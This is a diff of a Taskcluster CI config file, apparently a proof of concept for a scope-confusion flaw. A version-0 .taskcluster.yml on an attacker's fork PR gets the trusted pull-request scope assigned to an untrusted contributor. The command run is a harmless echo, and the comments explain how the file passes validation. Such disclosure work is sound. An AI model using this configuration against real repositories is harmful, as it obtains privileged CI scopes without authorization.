@@ -1,10 +1,39 @@
-version: 1
-policy:
-  pullRequests: public_restricted
-tasks: []
-# Goes on the DEFAULT branch (main) of sys0xFF/tc-poc.
-# getRepoPolicy reads policy.pullRequests from the RAW default-branch YAML
-# (no json-e rendering), so this is all that's needed to make the repo
-# public_restricted. `tasks: []` keeps the default branch clean: a push of
-# this file does not try to create any task (no extra InsufficientScopes
-# commit comment).
+version: 0
+metadata:
+  name: "v0 scope-confusion PoC"
+  description: "Untrusted non-collaborator fork PR carrying a version-0 head .taskcluster.yml"
+  owner: "axonogenesis@proton.me"
+  source: "https://github.com/sys0xFF/tc-poc"
+tasks:
+  - provisionerId: proj-getting-started
+    workerType: tutorial
+    # jparam time templates: MUST be quoted; jparam strips the quotes and
+    # passes "0 seconds"/"1 hour" to $fromNow (tc.fromNowJSON) -> valid ISO.
+    # Verified locally against json-parameterization + @taskcluster/client.
+    created: "{{ '0 seconds' | $fromNow }}"
+    deadline: "{{ '1 hour' | $fromNow }}"
+    extra:
+      github:
+        env: true
+        events:
+          - pull_request.opened
+          - pull_request.synchronize
+          - pull_request.reopened
+    payload:
+      maxRunTime: 600
+      image: "ubuntu:latest"
+      command:
+        - "/bin/bash"
+        - "-c"
+        - "echo scope-confusion-poc"
+    metadata:
+      name: "v0 PR task"
+      description: "Demonstrates the trusted :pull-request scope assigned to an untrusted PR"
+      owner: "axonogenesis@proton.me"
+      source: "https://github.com/sys0xFF/tc-poc"
+# Goes on the ATTACKER fork branch (n4sh7/tc-poc:poc) as .taskcluster.yml.
+# Survives VersionZero.compileTasks filtering (extra.github.events includes
+# pull_request.opened). With created/deadline valid, queue.createTask passes
+# input validation and fails on scopes -> the github service posts a PR comment
+# printing the attempted scopes, which include the TRUSTED
+# assume:repo:github.com/sys0xFF/tc-poc:pull-request.
